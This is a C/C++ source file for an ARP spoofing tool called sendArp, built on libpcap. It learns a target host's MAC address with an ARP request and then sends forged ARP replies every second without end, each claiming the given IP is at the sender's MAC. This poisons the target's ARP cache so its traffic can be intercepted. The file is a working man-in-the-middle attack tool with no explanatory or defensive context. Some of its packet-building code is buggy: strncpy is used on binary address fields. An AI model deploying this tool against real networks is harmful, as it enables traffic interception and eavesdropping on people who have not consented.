#include <pcap.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

#define ARP_REQUEST 1
#define ARP_REPLY 2
#define PACKET_LEN 42
#define TYPE_ARP 0x0806
#define TYPE_IPV4 0x0800
#define HARDWARE_TYPE 0x01
#define HARDWARE_SIZE 0x06
#define PROTOCOL_SIZE 0x04

u_char buf[PACKET_LEN];
pcap_t* handle;

struct ifreq ifr;
unsigned char *mac;
unsigned char *dst_mac;

struct EthHdr {
	char dst_mac[6];
	char src_mac[6];
	uint16_t type;
};

struct ArpHdr {
	uint16_t hardware_addr_type;
	uint16_t protocol_addr_type;
	uint8_t hardware_addr_len;
	uint8_t protocol_addr_len;
	uint16_t opcode;
	char sender_mac[6];
	char sender_ip[4];
	char target_mac[6];
	char target_ip[4];
};

void usage() {
	printf("syntax: sendArp <interface> <sender_ip> <target_ip>\n");
	printf("sample: sendArp wlan0 192.168.10.2 192.168.10.1\n");
}

void printMac(u_char* buf) {
	printf("%02x:%02x:%02x:%02x:%02x:%02x", buf[0], buf[1], buf[2], buf[3], buf[4], buf[5]);
}

void printIP(u_char* buf) {
	printf("%d.%d.%d.%d", buf[0], buf[1], buf[2], buf[3]);
}

int sendArp(pcap_t* handle, uint32_t sender_ip, uint32_t target_ip, uint16_t type) {

	EthHdr* eth_p = (EthHdr*) &buf[0];
	ArpHdr* arp_p = (ArpHdr*) &buf[14];

	if (type == ARP_REQUEST) {
		strncpy(eth_p->dst_mac, "\xff\xff\xff\xff\xff\xff", 6); 
	} else if (type == ARP_REPLY) {
		strncpy(eth_p->dst_mac, (char*)dst_mac, 6);
	}

	strncpy(eth_p->src_mac, (char*)mac, 6);
	eth_p->type = htons(TYPE_ARP);

	arp_p->hardware_addr_type = htons(HARDWARE_TYPE);
	arp_p->protocol_addr_type = htons(TYPE_IPV4);
	arp_p->hardware_addr_len = HARDWARE_SIZE;
	arp_p->protocol_addr_len = PROTOCOL_SIZE;
	arp_p->opcode = htons(type);

	strncpy(arp_p->sender_mac, (char*)mac, 6);
	strncpy(arp_p->sender_ip, (char*)&sender_ip, 4);
	strncpy(arp_p->target_mac, "", 6);

	if (type == ARP_REQUEST) {
		strncpy(arp_p->target_mac, "\x00\x00\x00\x00\x00\x00", 6);
	} else if (type == ARP_REPLY) {
		strncpy(arp_p->target_mac, (char*)dst_mac, 6);
	}
	strncpy(arp_p->target_ip, (char*)&target_ip, 4);

	if (type == ARP_REQUEST) {
		printf("[ REQUEST ] who is (");
		printIP((u_char*)&target_ip);
		printf(") ?\n");
	} else if (type == ARP_REPLY) {
		printf("[  REPLY  ] (");
		printIP((u_char*)&sender_ip);
		printf(") is at (");
		printMac((u_char*)mac);
		printf(")\n");
	}

	if (pcap_sendpacket(handle, buf, PACKET_LEN) != 0) {
		fprintf(stderr, "couldn't send packet : %s\n", pcap_geterr(handle));
		return -1;
	}

	return 0;
}

void getMyMac(char *dev) {
	int fd;
	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name , dev , IFNAMSIZ - 1);

	ioctl(fd, SIOCGIFHWADDR, &ifr);
	mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;	
}

int main(int argc, char* argv[]) {
	
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	uint32_t sender_ip = inet_addr(argv[2]);
	uint32_t target_ip = inet_addr(argv[3]);

	getMyMac(dev);

	char errbuf[PCAP_ERRBUF_SIZE];
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s : %s\n", dev, errbuf);
		return -1;
	}

	if (sendArp(handle, sender_ip, target_ip, ARP_REQUEST) != 0) {
		fprintf(stderr, "couldn't send request\n");
		return -1;
	}

	while ( true ) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);

		if (res == 0) continue;
		if (res == -1 || res == -2) break;

		EthHdr* eth_p = (EthHdr*) packet;
		if (eth_p->type != htons(0x0806)) continue;

		ArpHdr* arp_p = (ArpHdr*) ((uint8_t*)(packet) + 14);
		if (strncmp(arp_p->target_mac,(char*) mac, 6)) continue;

		dst_mac = (u_char*)arp_p->sender_mac;
		memcpy(dst_mac, &arp_p->sender_mac[0], 6);
	
		break;
	}

	while ( true ) {
		if (sendArp(handle, sender_ip, target_ip, ARP_REPLY) != 0) {
			fprintf(stderr, "couldn't send reply\n");
			return -1;
		}
		sleep(1);
	}

	return 0;
}